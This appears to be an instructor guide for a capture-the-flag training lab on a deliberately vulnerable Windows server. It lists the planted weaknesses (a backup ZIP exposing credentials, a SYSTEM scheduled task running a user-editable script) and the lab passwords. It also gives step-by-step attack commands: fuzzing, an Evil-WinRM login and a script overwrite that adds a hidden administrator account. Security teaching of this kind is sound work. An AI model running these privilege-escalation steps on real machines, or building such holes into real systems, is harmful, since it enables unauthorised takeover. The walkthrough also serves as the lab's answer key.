# FINAL BOSS Lab

This lab tests the student's ability to identify hidden vulnerabilities among multiple decoys and exploit a misconfiguration on a Windows server. Throughout this challenge, students will learn to:

- Perform web reconnaissance and directory fuzzing.
- Identify exposed backup files.
- Connect via Evil-WinRM using discovered credentials.
- Escalate privileges in Windows through a vulnerable scheduled task.
- Decode a hidden flag in base64.


## Machine Specifications 🖥️

- **System:** Windows Server (GUI or Core with PowerShell)
- **Active services:**
    - IIS (Port 80)
    - WinRM (Port 5985)
    - SSH (Optional, decoy)
    - FTP (Optional, decoy)
- **Website:** Umbrella Corporation (fake site with LFI, SQLi decoys)
- **Site path:** `C:\inetpub\wwwroot`
- **Real vulnerable content:**
    - Folder: `/backup/web_backup.zip`
    - Content:
        ```php
        <?php
        $user = "wesker";
        $pass = "UmbrellaForever!";
        ?>
        ```
- **User with remote access:** `wesker`
- **Password:** `UmbrellaForever!`
- **Vulnerable script:** `C:\Scripts\run.ps1` (editable by `wesker`)
- **Scheduled task:** `BackdoorScript` runs `run.ps1` every minute as SYSTEM.
- **Flag:** `C:\Users\Administrator\Desktop\flag.txt`

### Machine Credentials

```bash
hostname: finalboss-lab
username: Administrator
password: 4geeks-lab
```

## Expected Steps for the Student

1. **Perform network reconnaissance to identify the machine.**
     - Use tools like `nmap`, `netdiscover`, or `arp-scan`.
     - Should detect **80 (HTTP)** and **5985 (WinRM)** ports open.

2. **Access the website from the browser.**
     - Visit `http://<IP>` and explore routes such as:
         ```
         index.php?page=home
         ```

3. **Perform directory fuzzing.**
     - Use tools like `gobuster` to discover:
         ```
         /backup/web_backup.zip
         ```

4. **Extract credentials from the ZIP file.**
     - The `config.php` file inside the backup exposes the user `wesker` and their password.

5. **Connect via WinRM using Evil-WinRM.**
     - Log in with:
         ```bash
         evil-winrm -i <IP> -u wesker -p 'UmbrellaForever!'
         ```

6. **Modify the vulnerable script.**
     - Change the content of `C:\Scripts\run.ps1` to:
         ```powershell
         net user chris P@ssw0rd123 /add
         net localgroup administrators chris /add
         ```

7. **Wait 1 minute for the task to execute.**
     - The user `chris` will be created as an administrator by the system.

8. **Connect as administrator.**
     - Access using:
         ```bash
         evil-winrm -i <IP> -u chris -p 'P@ssw0rd123'
         ```

9. **Read the encoded flag.**
     - Located on the `Administrator` user's desktop:
         ```powershell
         type C:\Users\Administrator\Desktop\flag.txt
         ```

10. **Decode the flag.**
        - Copy the base64 content and decode it using [CyberChef](https://gchq.github.io/CyberChef/) to obtain the flag in plain text.

